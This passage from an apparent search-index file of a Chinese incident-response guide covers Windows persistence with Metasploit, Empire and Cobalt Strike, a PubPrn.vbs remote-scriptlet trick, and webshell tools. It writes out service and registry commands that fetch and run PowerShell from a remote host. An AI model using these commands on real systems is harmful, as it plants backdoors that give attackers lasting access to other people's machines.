7\u4ee5\u4e0a\u7248\u672c\u5b58\u5728\u4e00\u4e2a\u540d\u4e3aPubPrn.vbs\u7684\u5fae\u8f6f\u5df2\u7b7e\u540dWSH\u811a\u672c\uff0c\u5176\u4f4d\u4e8eC:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8be5\u811a\u672c\u53ef\u4ee5\u53d1\u73b0\u5176\u663e\u7136\u662f\u7531\u7528\u6237\u63d0\u4f9b\u8f93\u5165\uff08\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\uff09\uff0c\u4e4b\u540e\u518d\u5c06\u53c2\u6570\u4f20\u9012\u7ed9GetObject() \"C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs\" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct test.sct <?XML version=\"1.0\"?> <scriptlet> <registration description=\"Bandit\" progid=\"Bandit\" version=\"1.00\" classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\" remotable=\"true\" > </registration> <script language=\"JScript\"> <![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); ]]> </script> </scriptlet>","title":"\u7b2c5\u7bc7\uff1aWindows\u547d\u4ee4\u884c\u6587\u4ef6\u4e0b\u8f7d\u65b9\u5f0f\u6c47\u603b"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E4%B8%89%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/","text":"0x00 \u524d\u8a00 \u00b6 \u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u6709\u4e09\u4e2a\u975e\u5e38\u7ecf\u5178\u7684\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6----Metasploit\u3001Empire\u3001Cobalt Strike\u3002 \u90a3\u4e48\uff0c\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u5230\u76ee\u6807\u4e3b\u673a\u6743\u9650\u540e\uff0c\u5982\u4f55\u5229\u7528\u6846\u67b6\u83b7\u5f97\u6301\u4e45\u6027\u6743\u9650\u5462\uff1f 0x01 MSF\u6743\u9650\u7ef4\u6301 \u00b6 \u4f7f\u7528MSF\u7ef4\u6301\u6743\u9650\u7684\u524d\u63d0\u662f\u5148\u83b7\u5f97\u4e00\u4e2a*meterpreter* shell\uff0c\u901a\u8fc7*meterpreter* shell\u83b7\u53d6\u6301\u4e45\u6027shell\u7684\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a Persistence\u6a21\u5757 \u901a\u8fc7\u542f\u52a8\u9879\u542f\u52a8(persistence)\u7684\u65b9\u5f0f\uff0c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u4ee5\u53cd\u5f39\u56de\u8fde\u3002 -U\uff1a\u8bbe\u7f6e\u540e\u95e8\u5728\u7528\u6237\u767b\u5f55\u540e\u81ea\u542f\u52a8\u3002\u8be5\u65b9\u5f0f\u4f1a\u5728HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u4e0b\u6dfb\u52a0\u6ce8\u518c\u8868\u4fe1\u606f\u3002\u63a8\u8350\u4f7f\u7528\u8be5\u53c2\u6570\uff1b -X\uff1a\u8bbe\u7f6e\u540e\u95e8\u5728\u7cfb\u7edf\u542f\u52a8\u540e\u81ea\u542f\u52a8\u3002\u8be5\u65b9\u5f0f\u4f1a\u5728HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u4e0b\u6dfb\u52a0\u6ce8\u518c\u8868\u4fe1\u606f\u3002\u7531\u4e8e\u6743\u9650\u95ee\u9898\uff0c\u4f1a\u5bfc\u81f4\u6dfb\u52a0\u5931\u8d25\uff0c\u540e\u95e8\u5c06\u65e0\u6cd5\u542f\u52a8\u3002 -S\uff1a\u4f5c\u4e3a\u670d\u52a1\u81ea\u52a8\u542f\u52a8\u4ee3\u7406\u7a0b\u5e8f\uff08\u5177\u6709SYSTEM\u6743\u9650\uff09 \u751f\u6210\u7684\u76f8\u5173\u6587\u4ef6\u4f4d\u7f6e \uff1a # \u540e\u95e8\u6587\u4ef6\u4f4d\u7f6e\uff1a C:\\Windows\\Temp C:\\Users\\Administrator\\AppData\\Local\\Temp # \u6ce8\u518c\u8868\u4f4d\u7f6e\uff1a HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ Metsvc \u6a21\u5757 \u901a\u8fc7\u670d\u52a1(metsvc)\u542f\u52a8\u7684\u65b9\u5f0f\uff0c\u5728\u76ee\u6807\u673a\u5668\u542f\u52a8\u540e\u81ea\u542f\u52a8\u4e00\u4e2a\u670d\u52a1\uff0c\u7b49\u5f85\u8fde\u63a5\u3002 \u540e\u95e8\u6392\u67e5\uff1a\u76ee\u6807\u4e3b\u673a\u4e0a\u5f00\u542f\u4e86\u4e00\u4e2aMeterpreter\u670d\u52a1\u3002 0x02 Empire \u6743\u9650\u7ef4\u6301 \u00b6 Empire\u7684persistence\u6a21\u5757\u63d0\u4f9b\u4e8618\u79cd\u6743\u9650\u7ef4\u6301\u7684\u65b9\u6cd5\uff0c\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u56db\u7c7b\uff0c\u5373 elevated\uff08\u7ba1\u7406\u6743\u9650\uff09 misc\uff08\u6742\u9879\uff09 powerbreach userland\uff08\u7528\u6237\u6743\u9650\uff09 registry* add_netuser deaduser backdoor_lnk schtasks* add_sid_history* eventlog* registry wmi* debugger* resolver schtasks wmi_updater* disable_machine_acct_change* get_ssps install_ssp* memssp* skeleton_key* \u6ce8\u518c\u8868 (Empire: agents) > agents (Empire: agents) > interact URL3FZBV (Empire: URL3FZBV) > usemodule persistence/elevated/registry* (Empire: powershell/persistence/elevated/registry) > set Listener test (Empire: powershell/persistence/elevated/registry) > execute \u56e0\u4e3a\u662f\u5f00\u673a\u542f\u52a8\uff0c\u6240\u4ee5\u4f1a\u5f39\u4e2a\u9ed1\u6846\uff0c\u4e4b\u540e\u8fd8\u4f1a\u5f39\u51fa\u6ce8\u518c\u8868\u6dfb\u52a0\u7684powershell\u542f\u52a8\u9879\u7684\u6846\uff0c\u5728\u6ce8\u518c\u8868\u4f4d\u7f6e\u5982\u4e0b\uff1a \u8ba1\u5212\u4efb\u52a1 (Empire: agents) > interact 9NZ2RWBC (Empire: 9NZ2RWBC) > usemodule persistence/elevated/schtasks* (Empire: powershell/persistence/elevated/schtasks) > set Listener test (Empire: powershell/persistence/elevated/schtasks) > set DailyTime 22:50 (Empire: powershell/persistence/elevated/schtasks) > execute \u5728\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u5e93\u53ef\u4ee5\u770b\u5230-\u4efb\u52a1\u4e3aUpdater-\u542f\u52a8\u7a0b\u5e8f\u5982\u4e0b\u53ef\u4ee5\u5230\u4e3apowershell wmi (Empire: agents) > interact 9NZ2RWBC (Empire: 9NZ2RWBC) > usemodule persistence/elevated/wmi (Empire: powershell/persistence/elevated/wmi) > set Listener test (Empire: powershell/persistence/elevated/wmi) > run \u5982\u4f55\u6e05\u9664\u540e\u95e8\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528Autoruns\uff0c\u9009\u62e9WMI\u9009\u9879\u5361\uff0c\u53f3\u952e\u5c31\u53ef\u4ee5\u5220\u9664\u6076\u610f\u540e\u95e8\u3002 0x03 Cobalt Strike\u6743\u9650\u7ef4\u6301 \u00b6 \u901a\u8fc7Cobalt Strike\u62ff\u5230\u4e00\u4e2ashell\uff0c\u7559\u540e\u95e8\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4e0b\u9762\u4ecb\u7ecd\u4e24\u79cd\u6bd4\u8f83\u5e38\u89c1\u7684\u65e0\u6587\u4ef6\u3001\u81ea\u542f\u52a8\u540e\u95e8\u3002 \u4eceCobalt Strike\u83dc\u5355\u680f\uff0cAttacks--Web Drive-by--Scaripted Web Delivery\uff0c\u751f\u6210powershell\u540e\u95e8\u3002 \u6839\u636e\u9700\u8981\u53ef\u4ee5\u81ea\u5df1\u9009\u62e9\uff0c\u586b\u5199\u6240\u9700\u53c2\u6570\u9ed8\u8ba4\u7aef\u53e3\u662f80\uff08\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u4e0d\u8981\u4f7f\u7528\u91cd\u590d\u7aef\u53e3\uff09\uff0cType\u9009\u62e9powershell\u3002 \u70b9\u51fbLaunch\u540e\uff0c\u8fd4\u56depowershell\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\u547d\u4ee4\u3002 \u670d\u52a1\u81ea\u542f\u52a8\u540e\u95e8 sc create \"Name\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" sc description Name \"Just For Test\" //\u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32 sc config Name start= auto //\u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8 net start Name //\u542f\u52a8\u670d\u52a1 \u91cd\u542f\u670d\u52a1\u5668\u540e\uff0c\u6210\u529f\u8fd4\u56de\u4e00\u4e2ashell\u3002 \u6ce8\u518c\u8868\u81ea\u542f\u52a8 \u5728windows\u542f\u52a8\u9879\u6ce8\u518c\u8868\u91cc\u9762\u6dfb\u52a0\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f\u8def\u5f84\uff0c\u5982\uff1a beacon>getsystem beacon>shell reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" /f \u8d26\u53f7\u6ce8\u9500\u540e\uff0c\u91cd\u65b0\u767b\u5f55\uff0c\u754c\u9762\u4e0a\u4f1a\u51fa\u73b0powershell\u5feb\u901f\u95ea\u8fc7\u6d88\u5931\uff0c\u6210\u529f\u8fd4\u56deshell\u3002 \u6ce8\u518c\u8868\u8fd8\u6709\u54ea\u4e9b\u952e\u503c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u81ea\u542f\u52a8\uff1a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon 0x04 \u7ed3\u675f\u8bed \u00b6 \u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u901a\u8fc7\u4e09\u5927\u6e17\u900f\u6846\u67b6\u8fdb\u884c\u6743\u9650\u7ef4\u6301\u7684\u51e0\u79cd\u65b9\u6cd5\uff0c\u4e86\u89e3\u653b\u51fb\u8005\u5e38\u7528\u7684\u6e17\u900f\u6846\u67b6\u53ca\u540e\u95e8\u6280\u672f\uff0c\u6709\u52a9\u4e8e\u66f4\u597d\u5730\u53bb\u53d1\u73b0\u5e76\u89e3\u51b3\u670d\u52a1\u5668\u5b89\u5168\u95ee\u9898\u3002","title":"\u7b2c6\u7bc7\uff1a\u4e09\u5927\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u6743\u9650\u7ef4\u6301\u6280\u672f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E4%B8%89%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/#0x00-\u524d\u8a00","text":"\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u6709\u4e09\u4e2a\u975e\u5e38\u7ecf\u5178\u7684\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6----Metasploit\u3001Empire\u3001Cobalt Strike\u3002 \u90a3\u4e48\uff0c\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u5230\u76ee\u6807\u4e3b\u673a\u6743\u9650\u540e\uff0c\u5982\u4f55\u5229\u7528\u6846\u67b6\u83b7\u5f97\u6301\u4e45\u6027\u6743\u9650\u5462\uff1f","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E4%B8%89%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/#0x01-msf\u6743\u9650\u7ef4\u6301","text":"\u4f7f\u7528MSF\u7ef4\u6301\u6743\u9650\u7684\u524d\u63d0\u662f\u5148\u83b7\u5f97\u4e00\u4e2a*meterpreter* shell\uff0c\u901a\u8fc7*meterpreter* shell\u83b7\u53d6\u6301\u4e45\u6027shell\u7684\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a Persistence\u6a21\u5757 \u901a\u8fc7\u542f\u52a8\u9879\u542f\u52a8(persistence)\u7684\u65b9\u5f0f\uff0c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u4ee5\u53cd\u5f39\u56de\u8fde\u3002 -U\uff1a\u8bbe\u7f6e\u540e\u95e8\u5728\u7528\u6237\u767b\u5f55\u540e\u81ea\u542f\u52a8\u3002\u8be5\u65b9\u5f0f\u4f1a\u5728HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u4e0b\u6dfb\u52a0\u6ce8\u518c\u8868\u4fe1\u606f\u3002\u63a8\u8350\u4f7f\u7528\u8be5\u53c2\u6570\uff1b -X\uff1a\u8bbe\u7f6e\u540e\u95e8\u5728\u7cfb\u7edf\u542f\u52a8\u540e\u81ea\u542f\u52a8\u3002\u8be5\u65b9\u5f0f\u4f1a\u5728HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u4e0b\u6dfb\u52a0\u6ce8\u518c\u8868\u4fe1\u606f\u3002\u7531\u4e8e\u6743\u9650\u95ee\u9898\uff0c\u4f1a\u5bfc\u81f4\u6dfb\u52a0\u5931\u8d25\uff0c\u540e\u95e8\u5c06\u65e0\u6cd5\u542f\u52a8\u3002 -S\uff1a\u4f5c\u4e3a\u670d\u52a1\u81ea\u52a8\u542f\u52a8\u4ee3\u7406\u7a0b\u5e8f\uff08\u5177\u6709SYSTEM\u6743\u9650\uff09 \u751f\u6210\u7684\u76f8\u5173\u6587\u4ef6\u4f4d\u7f6e \uff1a # \u540e\u95e8\u6587\u4ef6\u4f4d\u7f6e\uff1a C:\\Windows\\Temp C:\\Users\\Administrator\\AppData\\Local\\Temp # \u6ce8\u518c\u8868\u4f4d\u7f6e\uff1a HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ Metsvc \u6a21\u5757 \u901a\u8fc7\u670d\u52a1(metsvc)\u542f\u52a8\u7684\u65b9\u5f0f\uff0c\u5728\u76ee\u6807\u673a\u5668\u542f\u52a8\u540e\u81ea\u542f\u52a8\u4e00\u4e2a\u670d\u52a1\uff0c\u7b49\u5f85\u8fde\u63a5\u3002 \u540e\u95e8\u6392\u67e5\uff1a\u76ee\u6807\u4e3b\u673a\u4e0a\u5f00\u542f\u4e86\u4e00\u4e2aMeterpreter\u670d\u52a1\u3002","title":"0x01 MSF\u6743\u9650\u7ef4\u6301"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E4%B8%89%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/#0x02-empire-\u6743\u9650\u7ef4\u6301","text":"Empire\u7684persistence\u6a21\u5757\u63d0\u4f9b\u4e8618\u79cd\u6743\u9650\u7ef4\u6301\u7684\u65b9\u6cd5\uff0c\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u56db\u7c7b\uff0c\u5373 elevated\uff08\u7ba1\u7406\u6743\u9650\uff09 misc\uff08\u6742\u9879\uff09 powerbreach userland\uff08\u7528\u6237\u6743\u9650\uff09 registry* add_netuser deaduser backdoor_lnk schtasks* add_sid_history* eventlog* registry wmi* debugger* resolver schtasks wmi_updater* disable_machine_acct_change* get_ssps install_ssp* memssp* skeleton_key* \u6ce8\u518c\u8868 (Empire: agents) > agents (Empire: agents) > interact URL3FZBV (Empire: URL3FZBV) > usemodule persistence/elevated/registry* (Empire: powershell/persistence/elevated/registry) > set Listener test (Empire: powershell/persistence/elevated/registry) > execute \u56e0\u4e3a\u662f\u5f00\u673a\u542f\u52a8\uff0c\u6240\u4ee5\u4f1a\u5f39\u4e2a\u9ed1\u6846\uff0c\u4e4b\u540e\u8fd8\u4f1a\u5f39\u51fa\u6ce8\u518c\u8868\u6dfb\u52a0\u7684powershell\u542f\u52a8\u9879\u7684\u6846\uff0c\u5728\u6ce8\u518c\u8868\u4f4d\u7f6e\u5982\u4e0b\uff1a \u8ba1\u5212\u4efb\u52a1 (Empire: agents) > interact 9NZ2RWBC (Empire: 9NZ2RWBC) > usemodule persistence/elevated/schtasks* (Empire: powershell/persistence/elevated/schtasks) > set Listener test (Empire: powershell/persistence/elevated/schtasks) > set DailyTime 22:50 (Empire: powershell/persistence/elevated/schtasks) > execute \u5728\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u5e93\u53ef\u4ee5\u770b\u5230-\u4efb\u52a1\u4e3aUpdater-\u542f\u52a8\u7a0b\u5e8f\u5982\u4e0b\u53ef\u4ee5\u5230\u4e3apowershell wmi (Empire: agents) > interact 9NZ2RWBC (Empire: 9NZ2RWBC) > usemodule persistence/elevated/wmi (Empire: powershell/persistence/elevated/wmi) > set Listener test (Empire: powershell/persistence/elevated/wmi) > run \u5982\u4f55\u6e05\u9664\u540e\u95e8\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528Autoruns\uff0c\u9009\u62e9WMI\u9009\u9879\u5361\uff0c\u53f3\u952e\u5c31\u53ef\u4ee5\u5220\u9664\u6076\u610f\u540e\u95e8\u3002","title":"0x02 Empire \u6743\u9650\u7ef4\u6301"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E4%B8%89%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/#0x03-cobalt-strike\u6743\u9650\u7ef4\u6301","text":"\u901a\u8fc7Cobalt Strike\u62ff\u5230\u4e00\u4e2ashell\uff0c\u7559\u540e\u95e8\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4e0b\u9762\u4ecb\u7ecd\u4e24\u79cd\u6bd4\u8f83\u5e38\u89c1\u7684\u65e0\u6587\u4ef6\u3001\u81ea\u542f\u52a8\u540e\u95e8\u3002 \u4eceCobalt Strike\u83dc\u5355\u680f\uff0cAttacks--Web Drive-by--Scaripted Web Delivery\uff0c\u751f\u6210powershell\u540e\u95e8\u3002 \u6839\u636e\u9700\u8981\u53ef\u4ee5\u81ea\u5df1\u9009\u62e9\uff0c\u586b\u5199\u6240\u9700\u53c2\u6570\u9ed8\u8ba4\u7aef\u53e3\u662f80\uff08\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u4e0d\u8981\u4f7f\u7528\u91cd\u590d\u7aef\u53e3\uff09\uff0cType\u9009\u62e9powershell\u3002 \u70b9\u51fbLaunch\u540e\uff0c\u8fd4\u56depowershell\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\u547d\u4ee4\u3002 \u670d\u52a1\u81ea\u542f\u52a8\u540e\u95e8 sc create \"Name\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" sc description Name \"Just For Test\" //\u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32 sc config Name start= auto //\u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8 net start Name //\u542f\u52a8\u670d\u52a1 \u91cd\u542f\u670d\u52a1\u5668\u540e\uff0c\u6210\u529f\u8fd4\u56de\u4e00\u4e2ashell\u3002 \u6ce8\u518c\u8868\u81ea\u542f\u52a8 \u5728windows\u542f\u52a8\u9879\u6ce8\u518c\u8868\u91cc\u9762\u6dfb\u52a0\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f\u8def\u5f84\uff0c\u5982\uff1a beacon>getsystem beacon>shell reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" /f \u8d26\u53f7\u6ce8\u9500\u540e\uff0c\u91cd\u65b0\u767b\u5f55\uff0c\u754c\u9762\u4e0a\u4f1a\u51fa\u73b0powershell\u5feb\u901f\u95ea\u8fc7\u6d88\u5931\uff0c\u6210\u529f\u8fd4\u56deshell\u3002 \u6ce8\u518c\u8868\u8fd8\u6709\u54ea\u4e9b\u952e\u503c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u81ea\u542f\u52a8\uff1a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","title":"0x03 Cobalt Strike\u6743\u9650\u7ef4\u6301"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E4%B8%89%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/#0x04-\u7ed3\u675f\u8bed","text":"\u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u901a\u8fc7\u4e09\u5927\u6e17\u900f\u6846\u67b6\u8fdb\u884c\u6743\u9650\u7ef4\u6301\u7684\u51e0\u79cd\u65b9\u6cd5\uff0c\u4e86\u89e3\u653b\u51fb\u8005\u5e38\u7528\u7684\u6e17\u900f\u6846\u67b6\u53ca\u540e\u95e8\u6280\u672f\uff0c\u6709\u52a9\u4e8e\u66f4\u597d\u5730\u53bb\u53d1\u73b0\u5e76\u89e3\u51b3\u670d\u52a1\u5668\u5b89\u5168\u95ee\u9898\u3002","title":"0x04 \u7ed3\u675f\u8bed"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC7%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81WebShell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/","text":"\u653b\u51fb\u8005\u5728\u5165\u4fb5\u7f51\u7ad9\u65f6\uff0c\u901a\u5e38\u8981\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u5199\u5165Webshell\uff0c\u4ece\u800c\u83b7\u5f97\u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u9650\uff0c\u6bd4\u5982\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3001\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u3001\u7a83\u53d6\u7528\u6237\u6570\u636e\uff0c\u7be1\u6539\u7f51\u7ad9\u9875\u9762\u7b49\u64cd\u4f5c\u3002 \u672c\u6587\u4ecb\u7ecd\u5341\u6b3e\u5e38\u7528\u7684Webshell\u7ba1\u7406\u5de5\u5177\uff0c\u4ee5\u4f9b\u4f60\u9009\u62e9\uff0c\u4f60\u4f1a\u9009\u62e9\u54ea\u4e00\u4e2a\uff1f 1\u3001\u4e2d\u56fd\u83dc\u5200(Chopper) \u4e2d\u56fd\u83dc\u5200\u662f\u4e00\u6b3e\u4e13\u4e1a\u7684\u7f51\u7ad9\u7ba1\u7406\u8f6f\u4ef6\uff0c\u7528\u9014\u5e7f\u6cdb\uff0c\u4f7f\u7528\u65b9\u4fbf\uff0c\u5c0f\u5de7\u5b9e\u7528\u3002\u53ea\u8981\u652f\u6301\u52a8\u6001\u811a\u672c\u7684\u7f51\u7ad9\uff0c\u90fd\u53ef\u4ee5\u7528\u4e2d\u56fd\u83dc\u5200\u6765\u8fdb\u884c\u7ba1\u7406\uff01\u5728\u975e\u7b80\u4f53\u4e2d\u6587\u73af\u5883\u4e0b\u4f7f\u7528\uff0c\u81ea\u52a8\u5207\u6362\u5230\u82f1\u6587\u754c\u9762\u3002UNICODE\u65b9\u5f0f\u7f16\u8bd1\uff0c\u652f\u6301\u591a\u56fd\u8bed\u8a00\u8f93\u5165\u663e\u793a\u3002 2\u3001\u8681\u5251(AntSword) AntSword\u662f\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\uff0c\u8de8\u5e73\u53f0\u7684\u7f51\u7ad9\u7ba1\u7406\u5de5\u5177\uff0c\u65e8\u5728\u6ee1\u8db3\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u4ee5\u53ca\u5177\u6709\u6743\u9650\u548c/\u6216\u6388\u6743\u7684\u5b89\u5168\u7814\u7a76\u4eba\u5458\u4ee5\u53ca\u7f51\u7ad9\u7ba1\u7406\u5458\u7684\u9700\u6c42\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/AntSwordProject/antSword 3\u3001C\u5200(Cknife) \u8fd9\u662f\u4e00\u6b3e\u8de8\u5e73\u53f0\u7684\u57fa\u4e8e\u914d\u7f6e\u6587\u4ef6\u7684\u4e2d\u56fd\u83dc\u5200\uff0c\u628a\u6240\u6709\u64cd\u4f5c\u7ed9\u4e88\u7528\u6237\u6765\u5b9a\u4e49\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/Chora10/Cknife 4\u3001\u51b0\u874e(Behinder) \u51b0\u874e\u201d\u662f\u4e00\u6b3e\u52a8\u6001\u4e8c\u8fdb\u5236\u52a0\u5bc6\u7f51\u7ad9\u7ba1\u7406\u5ba2\u6237\u7aef\u3002 github\u5730\u5740\uff1a https://github.com/rebeyond/Behinder 5\u3001Xise XISE WebShell\u7ba1\u7406\u5de5\u5177\u3002 6\u3001Altman Altman3\u662f\u4e00\u6b3e\u6e17\u900f\u6d4b\u8bd5\u8f6f\u4ef6\uff0c\u57fa\u4e8e.Net4.0\u5f00\u53d1\uff0c\u4f9d\u6258Eto.Form\u53ef\u4ee5\u5b8c\u7f8e\u8fd0\u884c\u5728Windows\u3001Linux\u3001Mac\u7b49\u591a\u4e2a\u5e73\u53f0\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/keepwn/Altman 7\u3001Weevely Weevely\u662f\u4e00\u79cdPython\u7f16\u5199\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u8de8\u5e73\u53f0\uff0c\u53ea\u652f\u6301PHP\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/epinna/weevely3 \u7528\u6cd5\u793a\u4f8b\uff1a weevely generate <password> <path> weevely <URL> <password> [cmd] \u540c\u65f6\uff0c\u5728Kali 2.0 \u7248\u672c\u4e0b\uff0c\u96c6\u6210\u4e86\u4e09\u6b3eWeb\u540e\u95e8\u5de5\u5177\uff1aWebaCoo\u3001weevely\u3001PHP Meterpreter\u3002 8\u3001QuasiBot QuasiBot\u662f\u4e00\u6b3ephp\u7f16\u5199\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u53ef\u4ee5\u5bf9webshell\u8fdb\u884c\u8fdc\u7a0b\u6279\u91cf\u7ba1\u7406\u3002 github\u9879\u76ee\u5730\u5740\uff1a 